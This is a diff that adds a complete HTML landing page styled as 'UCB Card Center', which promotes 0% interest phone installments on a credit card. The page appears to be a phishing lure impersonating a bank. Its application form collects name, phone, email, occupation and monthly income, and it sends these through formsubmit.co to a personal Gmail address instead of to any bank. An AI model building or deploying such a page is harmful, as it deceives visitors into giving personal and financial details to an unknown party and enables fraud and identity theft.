@@ -1,0 +1,317 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UCB Card Center - Apply Now</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+body{
+    margin:0;
+    font-family:'Poppins',sans-serif;
+    background:#f4f7f7;
+    color:#1c1c1c;
+}
+
+.hero{
+    background:linear-gradient(135deg,#e8f4f4,#ffffff);
+    padding:40px 20px;
+}
+
+.container{
+    max-width:1200px;
+    margin:auto;
+}
+
+.topbar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:30px;
+}
+
+.logo{
+    font-size:32px;
+    font-weight:700;
+    color:#006b5e;
+}
+
+.apply-btn{
+    background:#006b5e;
+    color:white;
+    padding:14px 24px;
+    border-radius:12px;
+    text-decoration:none;
+    font-weight:600;
+}
+
+.hero-content{
+    display:flex;
+    flex-wrap:wrap;
+    align-items:center;
+    gap:40px;
+}
+
+.left{
+    flex:1;
+    min-width:300px;
+}
+
+.right{
+    flex:1;
+    text-align:center;
+}
+
+.badge{
+    background:#f0b429;
+    color:#000;
+    display:inline-block;
+    padding:8px 16px;
+    border-radius:999px;
+    font-weight:600;
+    margin-bottom:20px;
+}
+
+h1{
+    font-size:56px;
+    line-height:1.1;
+    margin:0;
+    color:#00594f;
+}
+
+.highlight{
+    color:#d89c00;
+}
+
+.subtitle{
+    font-size:20px;
+    margin-top:20px;
+}
+
+.cards{
+    display:flex;
+    gap:16px;
+    margin-top:24px;
+    flex-wrap:wrap;
+}
+
+.card{
+    background:white;
+    padding:16px;
+    border-radius:14px;
+    box-shadow:0 4px 12px rgba(0,0,0,0.08);
+    flex:1;
+    min-width:150px;
+}
+
+.form-section{
+    background:white;
+    margin-top:-40px;
+    border-radius:20px;
+    padding:40px;
+    box-shadow:0 6px 24px rgba(0,0,0,0.1);
+}
+
+form{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:20px;
+}
+
+input,
+select,
+textarea{
+    padding:14px;
+    border:1px solid #d8d8d8;
+    border-radius:10px;
+    font-size:15px;
+    width:100%;
+    box-sizing:border-box;
+}
+
+.full{
+    grid-column:1/-1;
+}
+
+.submit-btn{
+    background:#006b5e;
+    color:white;
+    border:none;
+    padding:18px;
+    border-radius:12px;
+    font-size:18px;
+    font-weight:700;
+    cursor:pointer;
+}
+
+.footer{
+    text-align:center;
+    padding:30px;
+    color:#666;
+}
+
+.phone-img{
+    width:100%;
+    max-width:500px;
+    border-radius:20px;
+}
+
+@media(max-width:768px){
+
+    h1{
+        font-size:40px;
+    }
+
+    form{
+        grid-template-columns:1fr;
+    }
+
+}
+
+</style>
+</head>
+
+<body>
+
+<section class="hero">
+
+<div class="container">
+
+<div class="topbar">
+<div class="logo">UCB Card Center</div>
+
+<a href="#apply" class="apply-btn">
+Apply Card Now
+</a>
+</div>
+
+<div class="hero-content">
+
+<div class="left">
+
+<div class="badge">
+0% INSTALLMENT PROMO
+</div>
+
+<h1>
+Use UCB Credit Card
+<span class="highlight">Pay Later</span>
+With 0% Interest
+</h1>
+
+<p class="subtitle">
+Get your dream phone today with flexible installment plans up to 6 months.
+</p>
+
+<div class="cards">
+
+<div class="card">
+<h3>0%</h3>
+<p>Interest for 6 months</p>
+</div>
+
+<div class="card">
+<h3>$1,000</h3>
+<p>Maximum installment</p>
+</div>
+
+<div class="card">
+<h3>Fast</h3>
+<p>Quick approval process</p>
+</div>
+
+</div>
+</div>
+
+<div class="right">
+
+<img
+class="phone-img"
+src="https://images.unsplash.com/photo-1592750475338-74b7b21085ab?q=80&w=1200&auto=format&fit=crop"
+alt="Phone">
+
+</div>
+
+</div>
+</div>
+</section>
+
+<section class="container form-section" id="apply">
+
+<h2>Apply in 2 Minutes</h2>
+
+<p>
+Fill in your details and our team will contact you shortly.
+</p>
+
+<form action="https://formsubmit.co/sothearylim999@gmail.com" method="POST">
+
+<input
+type="text"
+name="name"
+placeholder="Full Name"
+required>
+
+<input
+type="tel"
+name="phone"
+placeholder="Phone Number"
+required>
+
+<input
+type="email"
+name="email"
+placeholder="Email Address">
+
+<select name="card">
+
+<option>Select Preferred Card</option>
+
+<option>Visa Platinum</option>
+
+<option>Infinite Card</option>
+
+<option>Gold Card</option>
+
+</select>
+
+<input
+type="text"
+name="occupation"
+placeholder="Occupation">
+
+<input
+type="number"
+name="income"
+placeholder="Monthly Income">
+
+<textarea
+class="full"
+name="message"
+placeholder="Additional Information"
+style="height:120px;">
+</textarea>
+
+<button
+class="submit-btn full"
+type="submit">
+
+Submit Application
+
+</button>
+
+</form>
+
+</section>
+
+<div class="footer">
+© 2026 UCB Card Center • Fast • Easy • Secure
+</div>
+
+</body>
+</html>
+```
